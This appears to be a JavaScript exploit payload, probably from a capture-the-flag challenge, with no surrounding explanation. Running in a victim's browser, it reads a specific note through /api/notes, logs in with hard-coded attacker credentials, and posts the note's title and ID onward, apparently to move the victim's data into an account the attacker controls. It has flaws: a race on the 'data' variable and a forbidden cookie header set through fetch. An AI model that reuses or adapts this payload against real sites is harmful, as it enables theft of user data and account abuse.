function f(cookie) {
    let url = "/api/notes?id=3d0259ce-8c68-42d5-ac29-1e96e322d4e4";
    let url2 = "/api/notes";
    let data;

    fetch(url)
        .then(
            (response) => {
                return response.json();
            }
        ).then(
            (response) => {
                data = response[0];
            });

    fetch(
        "/login", {
        method: "POST",
        headers: {
            "content-type": "application/x-www-form-urlencoded"
        },
        body: "username=qweasd&password=qweasd"
    }).then(
        (response) => {
            fetch(
                url2, {
                method: "POST",
                headers: {
                    "content-type": "application/json",
                    "cookie": "session=" + cookie
                },
                body: JSON.stringify({ "title": data.title, "content": data.id })
            }
            );
        });
    return ""
}
